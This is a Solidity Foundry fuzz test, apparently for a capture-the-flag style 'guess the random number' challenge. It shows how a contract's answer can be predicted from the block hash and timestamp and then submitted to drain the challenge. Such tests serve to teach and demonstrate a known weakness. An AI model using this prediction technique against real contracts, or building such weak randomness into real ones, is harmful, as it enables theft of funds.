
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge target;

    function setUp() public {
        vm.deal(address(this), 5 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        
        // --- 1. Constraints ---
        // Ensure blockNumber is at least 1 to prevent underflow in blockhash calculation
        blockNumber = bound(blockNumber, 1, type(uint64).max);
        blockTimestamp = bound(blockTimestamp, 1, type(uint64).max);

        // --- 2. State Configuration ---
        
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Deploy the contract within the test to apply the fuzzed block environment to the constructor
        target = new GuessTheRandomNumberChallenge{value: 1 ether}();

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable logic locally inside the test
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(blockNumber - 1), blockTimestamp))));
                
        target.guess{value: 1 ether}(predictedAnswer);

        assertTrue(target.isComplete());
    }

    receive() external payable {}
}
